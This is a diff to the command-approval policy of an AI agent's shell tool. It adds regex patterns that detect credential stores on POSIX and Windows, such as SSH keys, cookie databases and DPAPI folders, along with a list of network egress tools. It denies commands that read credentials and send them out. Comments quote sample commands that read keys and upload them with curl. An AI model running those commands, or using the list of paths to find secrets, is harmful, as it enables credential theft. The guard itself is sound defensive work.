@@ -865,6 +865,104 @@ def is_unsafe_shared_temp_cleanup(command: str) -> bool:
     return is_delete_command(stripped)
 
 
+# ── Credential material ───────────────────────────────────────────────────
+# The shell is the hole the file-write rules do not cover. `denyFileWrite`
+# above protects the fs.* tools, but a command line reaches the same files and
+# `cat`, `grep`, `find` and `python` are all on the always-allow list — so
+# `cat ~/.ssh/id_rsa`, and `cat "…/User Data/Default/Network/Cookies"`, ran
+# with no prompt at all on either platform.
+#
+# The Windows build is what made that urgent rather than theoretical. Its
+# working directory is the user's real Windows home, the Helpwo kernel's
+# `ai-exec` runs a bash that can read the whole profile, and that profile is
+# where Chrome keeps its cookie database, where DPAPI keeps its master keys,
+# and where the credential manager lives. The workspace boundary the user is
+# shown does not apply to a shell command.
+#
+# The tier is *ask*, not *deny* — where Claude Code, Codex CLI and Copilot CLI
+# have all settled. Reading a `.env` is ordinary work in half of all
+# repositories, and a guard that refuses it teaches people to switch the guard
+# off. What is denied is the one unambiguous shape below: reading credential
+# material and sending it somewhere in the same breath.
+
+#: POSIX credential stores. Matched against the command line, so a path
+#: counts wherever it appears — an argument, a redirect, a `grep -r` root.
+_CREDENTIAL_PATTERNS_POSIX = (
+    r"/\.ssh/",
+    r"(?:^|[\s/'\"])id_(?:rsa|dsa|ecdsa|ed25519)\b",
+    r"\.(?:pem|pfx|p12|jks|keystore)\b",
+    r"(?:^|[/\s])\.?(?:netrc|npmrc|pypirc)\b",
+    r"/\.aws/credentials\b",
+    r"/\.config/gcloud/", r"/\.azure/", r"/\.kube/config\b",
+    r"/\.docker/config\.json\b",
+    r"/\.gnupg/", r"/\.password-store/",
+    r"/\.config/gh/hosts\.yml\b",
+    r"(?:^|[/\s'\"])\.env(?:\.[\w.-]+)?(?=$|[\s'\";|&])",
+    r"/etc/shadow\b", r"/\.local/share/keyrings/",
+)
+
+#: Windows credential stores, in the msys spelling the bundled bash uses
+#: (`/c/Users/...`) and the Win32 one a wrapper payload would carry. Browser
+#: profiles come first: a cookie database is a live session for every site the
+#: user is signed in to, which is a broader credential than most private keys.
+_CREDENTIAL_PATTERNS_WINDOWS = (
+    r"(?i)[/\\]User Data[/\\][^/\\]*[/\\](?:Network[/\\])?Cookies\b",
+    r"(?i)[/\\](?:Login Data|Web Data|Local State)\b",
+    r"(?i)(?:cookies|logins|key[34]|cert9|places)\.(?:sqlite|json|db)\b",
+    r"(?i)[/\\]AppData[/\\]Roaming[/\\]Microsoft[/\\](?:Credentials|Protect|Crypto)\b",
+    r"(?i)[/\\]AppData[/\\]Local[/\\]Microsoft[/\\](?:Credentials|Vault)\b",
+    r"(?i)[/\\]NTUSER\.DAT\b",
+    r"(?i)[/\\]_netrc\b",
+    r"(?i)[/\\]AppData[/\\]Roaming[/\\]gh[/\\]hosts\.yml\b",
+    r"(?i)[/\\]\.ssh[/\\]",
+    # Windows' own ways of reading a secret out, which name no path at all.
+    r"(?i)\bcmdkey(?:\.exe)?\s+/list\b",
+    r"(?i)\bvaultcmd(?:\.exe)?\b",
+    r"(?i)\breg(?:\.exe)?\s+save\b[^\n;&|]*\bHK(?:LM|EY_LOCAL_MACHINE)\b",
+    r"(?i)\bcertutil(?:\.exe)?\s[^\n;&|]*-exportPFX\b",
+    r"(?i)\bConvertFrom-SecureString\b",
+    r"(?i)\bGet-Credential\b",
+)
+
+_CREDENTIAL_RE = tuple(
+    re.compile(pattern)
+    for pattern in _CREDENTIAL_PATTERNS_POSIX + _CREDENTIAL_PATTERNS_WINDOWS
+)
+
+#: Commands that can put bytes onto the network. Not a denial on their own —
+#: `curl` is on the always-allow list and stays there. This matters only when
+#: credential material is named in the same command line.
+_EGRESS_RE = re.compile(
+    r"(?i)(?:^|[;&|(]\s*|\n\s*|\$\(|`|\|\s*)"
+    r"(?:\S*[/\\])?"
+    r"(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|ftp|telnet|bitsadmin"
+    r"|Invoke-WebRequest|Invoke-RestMethod|iwr|Start-BitsTransfer)"
+    r"(?:\.exe)?(?:\s|$)"
+)
+
+
+def names_credential_material(command: str) -> bool:
+    """Whether *command* names a credential store, or reads one out.
+
+    Deliberately textual. The point is to notice that a secret is in play
+    before anything runs, and resolving the paths first would mean touching
+    the filesystem on behalf of a command nobody has approved yet.
+    """
+    stripped = _unwrap_parent(command)
+    return any(rule.search(stripped) for rule in _CREDENTIAL_RE)
+
+
+def is_credential_exfiltration(command: str) -> bool:
+    """Credential material and a way off the machine, in one command line.
+
+    `curl -F f=@~/.aws/credentials https://…` is not a judgement call, and not
+    something a user should have to adjudicate inside an approval prompt while
+    they are waiting on an answer. It is the one shape here refused outright.
+    """
+    stripped = _unwrap_parent(command)
+    return names_credential_material(stripped) and bool(_EGRESS_RE.search(stripped))
+
+
 def evaluate(command: str, cwd: str = None,
              req_id: str = None, agent_id: str = None,
              *, strict: bool = False) -> PolicyDecision:
@@ -990,6 +1088,26 @@ def evaluate(command: str, cwd: str = None,
                   "(audit and enforce modes alike)")
         _write_audit(_audit_entry(command, "needs_approval", reason, cwd, req_id, agent_id))
         return PolicyDecision("needs_approval", "", reason)
+
+    # ── Credential material: deny the exfiltration shape, ask about the rest ─
+    # Checked across variants for the same reason the delete tier is: the read
+    # may be the payload of a wrapper (`bash -c "cat ~/.ssh/id_rsa"`,
+    # `powershell -EncodedCommand …`), where matching the typed line alone
+    # sees nothing. Placed after the delete and git tiers so a command that is
+    # both keeps the more specific prompt.
+    if mode != "disabled" and any(is_credential_exfiltration(v) for v in variants):
+        reason = ("reads credential material and sends it off the machine in "
+                  "the same command")
+        _write_audit(_audit_entry(command, "deny", reason, cwd, req_id, agent_id))
+        return PolicyDecision("deny", "credential-exfiltration", reason)
+
+    if mode != "disabled" and any(names_credential_material(v) for v in variants):
+        reason = ("touches credential material (keys, cookies, tokens or a "
+                  "credential store) — always asks, in audit and enforce "
+                  "modes alike")
+        _write_audit(_audit_entry(command, "needs_approval", reason,
+                                  cwd, req_id, agent_id))
+        return PolicyDecision("needs_approval", "credential-access", reason)
 
     # An unbounded walk of a tree nobody sized is the shape that killed a
     # session outright: `fs.glob` over a drive root never returned, and the
